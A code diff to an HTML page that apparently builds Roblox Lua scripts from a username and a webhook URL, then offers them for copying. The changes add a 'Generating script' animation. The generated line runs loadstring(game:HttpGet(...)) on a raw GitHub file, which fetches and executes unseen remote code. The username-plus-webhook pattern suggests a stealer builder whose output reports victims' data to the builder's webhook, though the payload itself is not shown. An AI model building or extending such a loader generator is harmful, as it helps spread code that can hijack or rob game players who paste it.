@@ -96,6 +96,7 @@
             display: none;
             word-wrap: break-word;
             white-space: pre-wrap;
+            position: relative;
         }
         .copy-button {
             background: #00ff00;
@@ -117,6 +118,36 @@
             font-weight: bold;
             margin-top: 15px;
         }
+        .dots {
+            font-size: 1.5rem;
+            display: inline-block;
+            animation: dot 1s infinite;
+        }
+        .dot {
+            display: inline-block;
+            opacity: 0;
+            animation: dotOpacity 1.5s infinite;
+        }
+        .dot:nth-child(1) {
+            animation-delay: 0s;
+        }
+        .dot:nth-child(2) {
+            animation-delay: 0.5s;
+        }
+        .dot:nth-child(3) {
+            animation-delay: 1s;
+        }
+        @keyframes dot {
+            0% { opacity: 0; }
+            50% { opacity: 1; }
+            100% { opacity: 0; }
+        }
+        @keyframes dotOpacity {
+            0% { opacity: 0; }
+            33% { opacity: 1; }
+            66% { opacity: 0; }
+            100% { opacity: 0; }
+        }
     </style>
 </head>
 <body>
@@ -137,7 +168,10 @@
         <button onclick="closePopup()">Close</button>
     </div>
 
-    <div id="scriptOutput" class="script-output"></div>
+    <div id="scriptOutput" class="script-output">
+        <p id="scriptContent"></p>
+        <div id="copySection"></div>
+    </div>
 
     <script>
         let currentGame = '';
@@ -151,6 +185,8 @@
             document.getElementById('username').value = '';
             document.getElementById('webhook').value = '';
             lastGithubURL = '';
+            document.getElementById('copySection').innerHTML = '';
+            document.getElementById('scriptContent').innerHTML = '';
         }
 
         function closePopup() {
@@ -164,6 +200,8 @@
                 let script;
                 let githubURL = '';
                 
+                showGeneratingAnimation();
+
                 if (currentGame === 'Blox Fruits') {
                     githubURL = 'https://raw.githubusercontent.com/Goldded/Void2/refs/heads/main/Bloxfruits';
                     script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('${githubURL}'))()`;
@@ -186,21 +224,35 @@
                     showUpdatingNotification();
                 }
 
-                document.getElementById('scriptOutput').style.display = 'block';
-                document.getElementById('scriptOutput').textContent = script;
-
-                let copyButton = document.createElement('button');
-                copyButton.textContent = 'Copy Script';
-                copyButton.classList.add('copy-button');
-                copyButton.onclick = function() {
-                    navigator.clipboard.writeText(script).then(() => {
-                        alert('Script copied to clipboard!');
-                    });
-                };
-                document.getElementById('scriptOutput').appendChild(copyButton);
+                setTimeout(function () {
+                    document.getElementById('scriptContent').textContent = script;
+                    showCopyButton(script);
+                }, 2000);
             } else {
                 alert("Please enter both a username and webhook.");
             }
+        }
+
+        function showGeneratingAnimation() {
+            let content = document.getElementById('scriptContent');
+            content.textContent = 'Generating script';
+            let dots = document.createElement('span');
+            dots.classList.add('dots');
+            dots.innerHTML = '<span class="dot">.</span><span class="dot">.</span><span class="dot">.</span>';
+            content.appendChild(dots);
+            document.getElementById('scriptOutput').style.display = 'block';
+        }
+
+        function showCopyButton(script) {
+            let copyButton = document.createElement('button');
+            copyButton.textContent = 'Copy Script';
+            copyButton.classList.add('copy-button');
+            copyButton.onclick = function() {
+                navigator.clipboard.writeText(script).then(() => {
+                    alert('Script copied to clipboard!');
+                });
+            };
+            document.getElementById('copySection').appendChild(copyButton);
         }
 
         function showUpdatingNotification() {
